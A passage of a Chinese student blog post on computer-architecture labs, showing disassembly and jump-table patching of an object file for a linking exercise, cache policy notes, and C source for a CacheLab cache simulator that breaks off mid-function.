class="line">  e5:    c6 45 e3 66              movb   $0x66,-0x1d(%ebp)</span><br><span class="line">  e9:    eb 1d                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  eb:    c6 45 e3 5a              movb   $0x5a,-0x1d(%ebp)</span><br><span class="line">  ef:    eb 17                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  f1:    c6 45 e3 38              movb   $0x38,-0x1d(%ebp)</span><br><span class="line">  f5:    eb 11                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  f7:    c6 45 e3 49              movb   $0x49,-0x1d(%ebp)</span><br><span class="line">  fb:    eb 0b                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  fd:    c6 45 e3 33              movb   $0x33,-0x1d(%ebp)</span><br><span class="line"> 101:    eb 05                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line"> 103:    c6 45 e3 35              movb   $0x35,-0x1d(%ebp)</span><br><span class="line"> 107:    90                       nop</span><br><span class="line"> 108:    0f be 45 e3              movsbl -0x1d(%ebp),%eax</span><br><span class="line"> 10c:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line"> 10f:    50                       push   %eax</span><br><span class="line"> 110:    e8 fc ff ff ff           call   111 &lt;do_phase+0x111&gt;</span><br><span class="line">truetruetrue111: R_386_PC32    putchar</span><br><span class="line"> 115:    83 c4 10                 add    $0x10,%esp</span><br><span class="line"> 118:    83 45 e4 01              addl   $0x1,-0x1c(%ebp)</span><br><span class="line"> 11c:    8b 45 e4                 mov    -0x1c(%ebp),%eax</span><br><span class="line"> 11f:    83 f8 09                 cmp    $0x9,%eax</span><br><span class="line"> 122:    0f 86 11 ff ff ff        jbe    39 &lt;do_phase+0x39&gt;</span><br><span class="line"> 128:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line"> 12b:    6a 0a                    push   $0xa</span><br><span class="line"> 12d:    e8 fc ff ff ff           call   12e &lt;do_phase+0x12e&gt;</span><br><span class="line">truetruetrue12e: R_386_PC32    putchar</span><br><span class="line"> 132:    83 c4 10                 add    $0x10,%esp</span><br><span class="line"> 135:    90                       nop</span><br><span class="line"> 136:    8b 45 f4                 mov    -0xc(%ebp),%eax</span><br><span class="line"> 139:    65 33 05 14 00 00 00     xor    %gs:0x14,%eax</span><br><span class="line"> 140:    74 05                    je     147 &lt;do_phase+0x147&gt;</span><br><span class="line"> 142:    e8 fc ff ff ff           call   143 &lt;do_phase+0x143&gt;</span><br><span class="line">truetruetrue143: R_386_PC32    __stack_chk_fail</span><br><span class="line"> 147:    c9                       leave  </span><br><span class="line"> 148:    c3                       ret   </span><br></pre></td></tr></table></figure><p>由节头表信息可知.rodata在phase4.o的0x184处：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526190222214.png" alt="image-20210526190222214"></p><p>分析汇编代码可得映射关系，根据switch中对应输出的字符来修改switch跳转表信息：</p><p><img src="/2021/computer-architecture-hitlabs/Snipaste_2021-05-26_18-52-18.png" alt="Snipaste_2021-05-26_18-52-18"></p><p>以字符串第一个Y为例，对应的应该是学号中第一个字符’1’，故在.text中找到对应输出’1’的语句的地址填入switch跳转表对应的Y的位置（倒数第二个）：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526191508525.png" alt="image-20210526191508525"></p><p>原本的值与目标之间大了0x81，故将机器代码中的0xfd改为0xfd - 0x81 = 0x7c。则可以正确显示出第一个字符’1’。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526191833020.png" alt="image-20210526191833020"></p><p>其他的字符用相同的方法填入，成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526213213296.png" alt="image-20210526213213296"></p><h1 id="实验六-CacheLab"><a href="#实验六-CacheLab" class="headerlink" title="实验六 CacheLab"></a>实验六 CacheLab</h1><h3 id="用CPU-Z查看计算机Cache各参数"><a href="#用CPU-Z查看计算机Cache各参数" class="headerlink" title="用CPU-Z查看计算机Cache各参数"></a>用CPU-Z查看计算机Cache各参数</h3><p><img src="/2021/computer-architecture-hitlabs/image-20210528162204930.png" alt="image-20210528162204930"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210528211434587.png" alt="image-20210528211434587"></p><p>一级缓存：C = 32KB; S = 512; E = 8; B = 8B; s = 9; e = 3; b = 3.</p><p>二级缓存：C = 256KB; S = 4096; E = 4; B = 16B; s = 12; e = 2; b = 4.</p><p>三级缓存：C = 8MB; S = 131072; E = 16; B = 4B; s = 17; e = 4; b = 2.</p><h3 id="Cache读写策略："><a href="#Cache读写策略：" class="headerlink" title="Cache读写策略："></a>Cache读写策略：</h3><p>read-through：</p><ul><li>从 cache 中读取数据，读取到就直接返回 。</li><li>读取不到的话，先从低一层加载，写入到 cache 后返回响应。</li></ul><p>Cache Aside Pattern（旁路缓存模式）：</p><p>在更新数据时不更新缓存，而是删除缓存中的数据，在读取数据时，发现缓存中没了数据之后，再从数据库中读取数据，更新到缓存中。</p><p>读：write-through</p><p>写：更新低一层后删除cache中的内容。</p><p>写命中：</p><ol><li>直写 write-through</li></ol><p>立即将w的高速缓存块写回到紧接着的低一层中。</p><ol start="2"><li>写回 write-back</li></ol><p>尽可能地推迟更新，只有当被替换时才写回，需要增加一个格外的dirty bit。</p><p>写不命中：</p><ol><li>写分配 write-allocate</li></ol><p>将要修改的块从低一层运到缓存中，在缓存中修改。</p><ol start="2"><li>非写分配 not-write-allocate</li></ol><p>避开缓存，直接把这个字写入到低一层中。</p><h3 id="使用-valgrind-和-gprof-进行程序性能分析的方法。"><a href="#使用-valgrind-和-gprof-进行程序性能分析的方法。" class="headerlink" title="使用 valgrind 和 gprof 进行程序性能分析的方法。"></a>使用 valgrind 和 gprof 进行程序性能分析的<a href>方法</a>。</h3><h2 id="csim-cache-simulation"><a href="#csim-cache-simulation" class="headerlink" title="csim (cache simulation)"></a>csim (cache simulation)</h2><p>csim-ref执行文件的使用方法：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526161059425.png" alt="image-20210526161059425"></p><p>示例：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526161147468.png" alt="image-20210526161147468"></p><p>cachelab.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * cachelab.h - Prototypes for Cache Lab helper functions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CACHELAB_TOOLS_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHELAB_TOOLS_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TRANS_FUNCS 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">trans_func</span>&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*func_ptr)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]);</span><br><span class="line">  <span class="keyword">char</span>* description;</span><br><span class="line">  <span class="keyword">char</span> correct;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_hits;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_misses;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_evictions;</span><br><span class="line">&#125; <span class="keyword">trans_func_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * printSummary - This function provides a standard way for your cache</span></span><br><span class="line"><span class="comment"> * simulator * to display its final hit and miss statistics</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSummary</span><span class="params">(<span class="keyword">int</span> hits,  <span class="comment">/* number of  hits */</span></span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">int</span> misses, <span class="comment">/* number of misses */</span></span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">int</span> evictions)</span></span>; <span class="comment">/* number of evictions */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fill the matrix with data */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The baseline trans function that produces correct results. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">correctTrans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add the given function to the function list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerTransFunction</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">void</span> (*trans)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]), <span class="keyword">char</span>* desc)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CACHELAB_TOOLS_H */</span></span></span><br></pre></td></tr></table></figure><p>cachelab.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cachelab.c - Cache Lab helper functions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">trans_func_t</span> func_list[MAX_TRANS_FUNCS];</span><br><span class="line"><span class="keyword">int</span> func_counter = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * printSummary - Summarize the cache simulation statistics. Student cache simulators</span></span><br><span class="line"><span class="comment"> *                must call this function in order to be properly autograded. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSummary</span><span class="params">(<span class="keyword">int</span> hits, <span class="keyword">int</span> misses, <span class="keyword">int</span> evictions)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hits:%d misses:%d evictions:%d\n&quot;</span>, hits, misses, evictions);</span><br><span class="line">    FILE* output_fp = fopen(<span class="string">&quot;.csim_results&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    assert(output_fp);</span><br><span class="line">    <span class="built_in">fprintf</span>(output_fp, <span class="string">&quot;%d %d %d\n&quot;</span>, hits, misses, evictions);</span><br><span class="line">    fclose(output_fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * initMatrix - Initialize the given matrix </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++)&#123;</span><br><span class="line">            <span class="comment">// A[i][j] = i+j;  /* The matrix created this way is symmetric */</span></span><br><span class="line">            A[i][j]=rand();</span><br><span class="line">            B[j][i]=rand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">randMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++)&#123;</span><br><span class="line">            <span class="comment">// A[i][j] = i+j;  /* The matrix created this way is symmetric */</span></span><br><span class="line">            A[i][j]=rand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * correctTrans - baseline transpose function used to evaluate correctness </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">correctTrans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++)&#123;</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * registerTransFunction - Add the given trans function into your list</span></span><br><span class="line"><span class="comment"> *     of functions to be tested</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerTransFunction</span><span class="params">(<span class="keyword">void</span> (*trans)(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span>[N][M], <span class="keyword">int</span>[M][N]), </span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">char</span>* desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func_list[func_counter].func_ptr = trans;</span><br><span class="line">    func_list[func_counter].description = desc;</span><br><span class="line">    func_list[func_counter].correct = <span class="number">0</span>;</span><br><span class="line">    func_list[func_counter].num_hits = <span class="number">0</span>;</span><br><span class="line">    func_list[func_counter].num_misses = <span class="number">0</span>;</span><br><span class="line">    func_list[func_counter].num_evictions =<span class="number">0</span>;</span><br><span class="line">    func_counter++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>csim.c实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define DEBUG_ON </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS_LENGTH 64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type: Memory address */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="keyword">mem_addr_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type: Cache line</span></span><br><span class="line"><span class="comment">   LRU is a counter used to implement LRU replacement policy  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache_line</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> valid;</span><br><span class="line">    <span class="keyword">mem_addr_t</span> tag;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> lru;</span><br><span class="line">&#125; <span class="keyword">cache_line_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">cache_line_t</span>* <span class="keyword">cache_set_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">cache_set_t</span>* <span class="keyword">cache_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Globals set by command line args */</span></span><br><span class="line"><span class="keyword">int</span> verbosity = <span class="number">0</span>; <span class="comment">/* print trace if set */</span></span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0</span>; <span class="comment">/* set index bits */</span></span><br><span class="line"><span class="keyword">int</span> b = <span class="number">0</span>; <span class="comment">/* block offset bits */</span></span><br><span class="line"><span class="keyword">int</span> E = <span class="number">0</span>; <span class="comment">/* associativity */</span></span><br><span class="line"><span class="keyword">char</span>* trace_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Derived from command line args */</span></span><br><span class="line"><span class="keyword">int</span> S; <span class="comment">/* number of sets */</span></span><br><span class="line"><span class="keyword">int</span> B; <span class="comment">/* block size (bytes) */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Counters used to record cache statistics */</span></span><br><span class="line"><span class="keyword">int</span> miss_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> hit_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> eviction_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> lru_counter = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The cache we are simulating */</span></span><br><span class="line"><span class="keyword">cache_t</span> cache;  </span><br><span class="line"><span class="keyword">mem_addr_t</span> set_index_mask;<span class="comment">//用于从内存地址得到缓存组的索引值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * initCache - Allocate memory, write 0&#x27;s for valid and tag and LRU</span></span><br><span class="line"><span class="comment"> * also computes the set_index_mask</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">truecache = (<span class="keyword">cache_t</span>) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">cache_set_t</span>) * S);</span><br><span class="line">true<span class="keyword">int</span> i;</span><br><span class="line">true<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">truetruecache[i] = (<span class="keyword">cache_set_t</span>) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">cache_line_t</span>) * E);</span><br><span class="line">truetrue<span class="built_in">memset</span> (cache[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">cache_line_t</span>) * E);</span><br><span class="line">true&#125;</span><br><span class="line">trueset_index_mask = (<span class="keyword">mem_addr_t</span>) (<span class="built_in">pow</span>(<span class="number">2</span>, s) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * freeCache - free allocated memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">true<span class="keyword">int</span> i;</span><br><span class="line">true<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">truetrue<span class="built_in">free</span> (cache[i]);</span><br><span class="line">true&#125;</span><br><span class="line">true<span class="built_in">free</span> (cache);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * accessData - Access data at memory address addr.</span></span><br><span class="line"><span class="comment"> *   If it is already in cache, increase hit_count</span></span><br><span class="line"><span class="comment"> *   If it is not in cache, bring it in cache, increase miss count.</span></span><br><span class="line"><span class="comment"> *   Also increase eviction_count if a line is evicted.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">accessData</span><span class="params">(<span class="keyword">mem_addr_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">true<span 